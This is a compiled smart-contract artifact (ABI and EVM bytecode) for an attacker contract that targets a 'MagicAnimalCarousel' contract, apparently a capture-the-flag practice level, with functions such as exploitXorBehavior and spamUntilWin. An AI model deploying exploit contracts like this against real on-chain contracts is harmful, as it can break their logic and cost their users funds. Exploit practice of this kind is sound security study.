{"abi":[{"type":"constructor","inputs":[{"name":"_target","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"function","name":"exploitXorBehavior","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"spamUntilWin","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"target","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract IMagicAnimalCarousel"}],"stateMutability":"view"},{"type":"function","name":"winByReachingMaxCapacity","inputs":[],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x6080604052348015600e575f5ffd5b50604051610573380380610573833981016040819052602b91604e565b5f80546001600160a01b0319166001600160a01b03929092169190911790556079565b5f60208284031215605d575f5ffd5b81516001600160a01b03811681146072575f5ffd5b9392505050565b6104ed806100865f395ff3fe608060405234801561000f575f5ffd5b506004361061004a575f3560e01c80631955bedd1461004e578063634cee6a146100585780638b24d9e814610060578063d4b8399214610068575b5f5ffd5b610056610096565b005b610056610127565b610056610347565b5f5461007a906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b604080518082018252600a81527f414141414141414141410000000000000000000000000000000000000000000060208201525f549151632acee48960e21b815290916001600160a01b03169063ab3b9224906100f79084906004016103ed565b5f604051808303815f87803b15801561010e575f5ffd5b505af1158015610120573d5f5f3e3d5ffd5b5050505050565b5f5f5f9054906101000a90046001600160a01b03166001600160a01b0316633a5ddf306040518163ffffffff1660e01b8152600401602060405180830381865afa158015610177573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061019b9190610438565b90505f5b600a8110156103435760408051600c8082528183019092525f916020820181803683370190505090508160f81b815f815181106101de576101de610460565b60200101906001600160f81b03191690815f1a90535060ff60f81b8160018151811061020c5761020c610460565b60200101906001600160f81b03191690815f1a90535060ff60f81b8160028151811061023a5761023a610460565b60200101906001600160f81b03191690815f1a9053505f54604051632acee48960e21b81526001600160a01b039091169063ab3b92249061027f9084906004016103ed565b5f604051808303815f87803b158015610296575f5ffd5b505af11580156102a8573d5f5f3e3d5ffd5b50505050600a836102b99190610474565b61ffff165f5f9054906101000a90046001600160a01b03166001600160a01b03166326bad99e6040518163ffffffff1660e01b8152600401602060405180830381865afa15801561030c573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061033091906104a0565b1061033a57505050565b5060010161019f565b5050565b60408051600c8082528183019092525f9160208201818036833701905050905060ff60f81b815f8151811061037e5761037e610460565b60200101906001600160f81b03191690815f1a90535060fe60f81b816001815181106103ac576103ac610460565b60200101906001600160f81b03191690815f1a9053505f54604051632acee48960e21b81526001600160a01b039091169063ab3b9224906100f79084906004015b602081525f82518060208401525f5b8181101561041957602081860181015160408684010152016103fc565b505f604082850101526040601f19601f83011684010191505092915050565b5f60208284031215610448575f5ffd5b815161ffff81168114610459575f5ffd5b9392505050565b634e487b7160e01b5f52603260045260245ffd5b61ffff828116828216039081111561049a57634e487b7160e01b5f52601160045260245ffd5b92915050565b5f602082840312156104b0575f5ffd5b505191905056fea26469706673582212203a45001ef2d327569223518ee9633c8f953930074577c5d7a21b42aaf962433464736f6c634300081c0033","linkReferences":{}},"methodIdentifiers":{"exploitXorBehavior()":"1955bedd","spamUntilWin()":"634cee6a","target()":"d4b83992","winByReachingMaxCapacity()":"8b24d9e8"},"id":0}